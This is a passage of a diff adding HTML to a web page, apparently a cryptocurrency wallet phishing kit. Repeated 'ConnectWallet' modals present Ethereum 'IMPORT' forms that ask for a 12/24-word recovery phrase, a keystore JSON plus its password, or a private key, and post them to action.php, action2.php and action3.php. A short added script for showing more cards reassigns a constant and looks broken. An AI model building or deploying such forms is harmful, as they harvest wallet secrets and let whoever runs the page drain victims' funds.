+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  </div>
+  </div>
+  <div class="modal-footer">
+  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+  <!-- <button type="button" class="btn btn-primary">Send message</button> -->
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  
+  <div class="col-md-4 pb-4 extra">
+  <div class="blog_img">
+  <img src="SelectWallet/c04ae532094873c054a6c9339746c39c9ba5839c4d5bb2a1d9db51f9e5e77266.jpg"  class="img-fluid" alt="">
+  <div class="icon">
+  <i class="fas fa-pen"></i>
+  </div>
+  </div>
+  <div class="content">
+  <div class="authore">
+  <p>by admin</p>
+  <!-- <p>22/08/2021</p> -->
+  </div>
+  <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
+  <button type="button"  class="." style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
+  
+  
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+  <div class="modal-content">
+  <div class="modal-header">
+  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+  </div>
+  <div class="modal-body">
+  <div class="container-fluid">
+  <div class="row">
+  <div class="col-md-4 offset-md-4">
+  <ul style="display: flex;list-style: none;text-align: left;">
+  <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+  </ul>
+  </div>
+  </div>
+  </div>
+  <div class="tab-content">
+  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
+  <form method="post" action="action.php">
+  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="keystore">
+  <form method="post" action="action2.php">
+  <div class="form-group">
+  <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+  </div>
+  <div class="form-group">
+  <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">
+  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+  </p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="privatekey">
+  <form method="post" action="action3.php">
+  <div class="form-group">
+  <input class="form-control" name="privatekey" placeholder="Private Key" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  </div>
+  </div>
+  <div class="modal-footer">
+  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+  <!-- <button type="button" class="btn btn-primary">Send message</button> -->
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  
+  <div class="col-md-4 pb-4 extra">
+  <div class="blog_img">
+  <img src="SelectWallet/5a329cffe7aa4afa662139c3e119e51683bba096b0b877c5f55ba56b250632ab.jpg"  class="img-fluid" alt="">
+  <div class="icon">
+  <i class="fas fa-pen"></i>
+  </div>
+  </div>
+  <div class="content">
+  <div class="authore">
+  <p>by admin</p>
+  <!-- <p>22/08/2021</p> -->
+  </div>
+  <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
+  <button type="button"  class="." style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
+  
+  
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+  <div class="modal-content">
+  <div class="modal-header">
+  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+  </div>
+  <div class="modal-body">
+  <div class="container-fluid">
+  <div class="row">
+  <div class="col-md-4 offset-md-4">
+  <ul style="display: flex;list-style: none;text-align: left;">
+  <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+  </ul>
+  </div>
+  </div>
+  </div>
+  <div class="tab-content">
+  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
+  <form method="post" action="action.php">
+  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="keystore">
+  <form method="post" action="action2.php">
+  <div class="form-group">
+  <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+  </div>
+  <div class="form-group">
+  <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">
+  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+  </p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="privatekey">
+  <form method="post" action="action3.php">
+  <div class="form-group">
+  <input class="form-control" name="privatekey" placeholder="Private Key" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  </div>
+  </div>
+  <div class="modal-footer">
+  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+  <button type="button" class="btn btn-primary">Send message</button>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  
+</div>
+
+<div class="row blog_box">
+
+  <div class="col-md-4 pb-4 extra">
+  <div class="blog_img">
+  <img src="SelectWallet/881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb.jpg"  class="img-fluid" alt="">
+  <div class="icon">
+  <i class="fas fa-pen"></i>
+  </div>
+  </div>
+  <div class="content">
+  <div class="authore">
+  <p>by admin</p>
+  <!-- <p>22/08/2021</p> -->
+  </div>
+  <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
+  <button type="button"  class="" style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
+  
+  
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+  <div class="modal-content">
+  <div class="modal-header">
+  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+  </div>
+  <div class="modal-body">
+  <div class="container-fluid">
+  <div class="row">
+  <div class="col-md-4 offset-md-4">
+  <ul style="display: flex;list-style: none;text-align: left;">
+  <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+  </ul>
+  </div>
+  </div>
+  </div>
+  <div class="tab-content">
+  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
+  <form method="post" action="action.php">
+  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="keystore">
+  <form method="post" action="action2.php">
+  <div class="form-group">
+  <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+  </div>
+  <div class="form-group">
+  <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">
+  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+  </p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="privatekey">
+  <form method="post" action="action3.php">
+  <div class="form-group">
+  <input class="form-control" name="privatekey" placeholder="Private Key" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  </div>
+  </div>
+  <div class="modal-footer">
+  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+  <!-- <button type="button" class="btn btn-primary">Send message</button> -->
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  
+  <div class="col-md-4 pb-4 extra">
+  <div class="blog_img">
+  <img src="SelectWallet/img-13.jpg"  class="img-fluid" alt="">
+  <div class="icon">
+  <i class="fas fa-pen"></i>
+  </div>
+  </div>
+  <div class="content">
+  <div class="authore">
+  <p>by admin</p>
+  <!-- <p>22/08/2021</p> -->
+  </div>
+  <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
+  <button type="button"  class="." style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
+  
+  
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+  <div class="modal-content">
+  <div class="modal-header">
+  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+  </div>
+  <div class="modal-body">
+  <div class="container-fluid">
+  <div class="row">
+  <div class="col-md-4 offset-md-4">
+  <ul style="display: flex;list-style: none;text-align: left;">
+  <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+  </ul>
+  </div>
+  </div>
+  </div>
+  <div class="tab-content">
+  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
+  <form method="post" action="action.php">
+  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="keystore">
+  <form method="post" action="action2.php">
+  <div class="form-group">
+  <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+  </div>
+  <div class="form-group">
+  <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">
+  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+  </p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="privatekey">
+  <form method="post" action="action3.php">
+  <div class="form-group">
+  <input class="form-control" name="privatekey" placeholder="Private Key" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  </div>
+  </div>
+  <div class="modal-footer">
+  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+  <!-- <button type="button" class="btn btn-primary">Send message</button> -->
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  
+  <div class="col-md-4 pb-4 extra">
+  <div class="blog_img">
+  <img src="SelectWallet/img-24.jpg"  class="img-fluid" alt="">
+  <div class="icon">
+  <i class="fas fa-pen"></i>
+  </div>
+  </div>
+  <div class="content">
+  <div class="authore">
+  <p>by admin</p>
+  <!-- <p>22/08/2021</p> -->
+  </div>
+  <!-- <button style="float: right;" type="button" class=".">connectWallet</button> -->
+  <button type="button"  class="." style="float: right;" data-bs-toggle="modal" data-bs-target="#exampleModal" data-bs-whatever="@mdo">ConnectWallet</button>
+  
+  
+  <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
+  <div class="modal-dialog">
+  <div class="modal-content">
+  <div class="modal-header">
+  <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+  </div>
+  <div class="modal-body">
+  <div class="container-fluid">
+  <div class="row">
+  <div class="col-md-4 offset-md-4">
+  <ul style="display: flex;list-style: none;text-align: left;">
+  <li class="nav-item"><a class="nav-link active" data-toggle="tab" href="#phrase">Phrase</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#keystore">Keystore JSON</a></li>
+  <li class="nav-item"><a class="nav-link" data-toggle="tab" href="#privatekey">Private Key</a></li>
+  </ul>
+  </div>
+  </div>
+  </div>
+  <div class="tab-content">
+  <div role="tabpanel" class="tab-pane fade show active" id="phrase">
+  <form method="post" action="action.php">
+  <textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="keystore">
+  <form method="post" action="action2.php">
+  <div class="form-group">
+  <textarea class="form-control" name="keystorejson" rows="5" placeholder="Keystore JSON" required=""></textarea>
+  </div>
+  <div class="form-group">
+  <input class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">
+  Several lines of text beginning with "{...}" plus the password you used to encrypt it.
+  </p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  <div role="tabpanel" class="tab-pane fade" id="privatekey">
+  <form method="post" action="action3.php">
+  <div class="form-group">
+  <input class="form-control" name="privatekey" placeholder="Private Key" required="">
+  </div>
+  <p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
+  <input type="hidden" name="value" value="Ethereum">
+  <div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+  </form>
+  </div>
+  </div>
+  </div>
+  <div class="modal-footer">
+  <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
+  <button type="button" class="btn btn-primary">Send message</button>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  </div>
+  
+</div>
+
+
 
 </div>
 </section>
@@ -3850,7 +4820,23 @@ a reader will be distracted.</p>
 </footer>
 
 
+<script>
+const extra = document.querySelectorAll('.extra');
+const bat = document.querySelector('.bat');
 
+const currentimg = 2
+bat.addEventListener('click', function(){
+     for(var i = currentimg; i < currentimg+30;i++ ){
+        if(extra[i]){
+            extra[i].style.display = 'block';
+        }
+     }
+     currentimg += 2;
+     if(currentimg>=extra.length){
+       event.target.style.display= 'none';
+     }
+})
+</script>
 <!-- Option 1: Bootstrap Bundle with Popper -->
 <script src="script.js"></script>
 <script src="jquery.min.js"></script>
